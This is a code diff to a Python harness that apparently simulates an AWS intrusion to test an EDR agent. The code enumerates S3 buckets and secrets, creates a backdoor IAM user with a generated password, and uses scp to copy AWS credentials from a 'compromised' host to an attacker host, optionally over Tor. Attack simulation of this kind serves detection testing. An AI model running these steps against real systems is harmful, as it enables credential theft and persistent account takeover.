@@ -27,6 +27,7 @@ class ScenarioExecution:
         self.lambda_role_arn = None
         self.exfil_bucket_name = None
         self.compromised_ec2_key = "./compromised_id_rsa"
+        self.compromised_ec2_public_key = "./compromised_id_rsa.pub"
         self.attacker_ec2_key = "./attacker_id_rsa"
         self.backdoor_username = "prod-system-backup-user"
         self.attacker_env_vars = {}
@@ -67,12 +68,20 @@ class ScenarioExecution:
 
     def check_agent_connected(self):
         cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} "sudo /opt/traps/bin/cytool status"'
-        output = run_subprocess(cmdline, check=False)
+        output = run_subprocess(cmdline, return_output=True, check=False)
         edr_state = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
         if edr_state:
             edr_state = edr_state.group(1)
 
         return edr_state == "Enabled"
+
+    def get_compromised_server_sshd_public_key(self):
+        # This is not the key we generated to access the compromised machine, but the key used to verify its identity
+        # Although in this scenario host verification is not done in general, we still want to do it when connecting through Tor
+        cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} cat /etc/ssh/ssh_host_rsa_key.pub'
+        output = run_subprocess(cmdline, return_output=True)
+
+        return output
 
     def wait_for_agent(self):
         agent_connected = self.check_agent_connected()
@@ -134,17 +143,23 @@ class ScenarioExecution:
     def attempt_recon(self):
         # List buckets
         result = self.attacker_run('aws s3api list-buckets | jq ".Buckets[].Name"')
+
+        # If configuration related errors are seen, abort
+        if result.find(" by running ") != -1:
+            raise ("AWS Configuration error on attacker's machine, likely missing credentials")
+
         if result.find("AccessDenied") == -1:
             self.discovered_buckets = [name.strip('"') for name in result.split()]
-            print(colored(f"Buckets enumeration attempt discovered: {len(self.discovered_buckets)}", "red"))
+            print(colored(f"Buckets enumeration attempt discovered {len(self.discovered_buckets)} buckets", "red"))
         else:
             print(colored("Buckets enumeration attempt failed", "red"))
 
         # List secrets
         result = self.attacker_run('aws secretsmanager list-secrets | jq ".SecretList[].Name"')
+
         if result.find("AccessDenied") == -1:
             self.discovered_secrets = [name.strip('"') for name in result.split()]
-            print(colored(f"Secrets enumeration attempt discovered: {len(self.discovered_secrets)}", "red"))
+            print(colored(f"Secrets enumeration attempt discovered {len(self.discovered_secrets)} secrets", "red"))
         else:
             print(colored("Secrets enumeration attempt failed", "red"))
 
@@ -214,7 +229,7 @@ class ScenarioExecution:
         generated_password = ''.join(random.choices(password_charset, k=12))
         print(colored(f"Generated password for backdoor user {self.backdoor_username}:{generated_password}", "red"))
 
-        reuslt = self.attacker_run(
+        result = self.attacker_run(
             f"aws iam create-login-profile --user-name {self.backdoor_username} --password {generated_password}")
         if result.find("AccessDenied") != -1:
             print(colored("Failed to create login profile for new IAM user", "red"))
@@ -261,19 +276,31 @@ class ScenarioExecution:
 
             # Upload compromised SSH key to attacker's machine - Scenario with agent begins with the attackers having their hands on this SSH key
             print(colored("Uploading compromised machine SSH key onto attacker's machine", color="red"))
-            upload_result = upload_file_to_server(self.compromised_ec2_key,
-                                                  "ubuntu",
-                                                  self.attacker_ec2_external_ip,
-                                                  "/home/ubuntu/",
-                                                  key_path="./attacker_id_rsa")
+            upload_file_to_server(self.compromised_ec2_key,
+                                  "ubuntu",
+                                  self.attacker_ec2_external_ip,
+                                  "/home/ubuntu/",
+                                  key_path="./attacker_id_rsa")
+
+            # Add compromised server identity to known hosts of attacker's machine for verification
+            print(colored("Adding public key of compromised machine to known hosts", color="red"))
+
+            compromised_sshd_public_key = self.get_compromised_server_sshd_public_key()
+            self.attacker_run(
+                f"echo {self.compromised_ec2_external_ip} {compromised_sshd_public_key} >> ~/.ssh/known_hosts",
+                check=True,
+                use_tor=False)
 
             # Local AWS CLI credentials are exfilterated onto attacker's machine
-            print(colored("Exfiltration AWS credentials from compromised machine onto attacker's machine", color="red"))
+            print(colored("Exfiltrating AWS credentials from compromised machine onto attacker's machine", color="red"))
+            self.attacker_run("mkdir ~/.aws")
+
             self.attacker_run(
-                f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/credentials ./.aws/credentials"
-            )
+                f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/credentials ./.aws/credentials",
+                check=True)
             self.attacker_run(
-                f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/config ./.aws/config")
+                f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/config ./.aws/config",
+                check=True)
 
         else:
             print(colored("Agent not included in the scenario, procceeding...", color="yellow"))
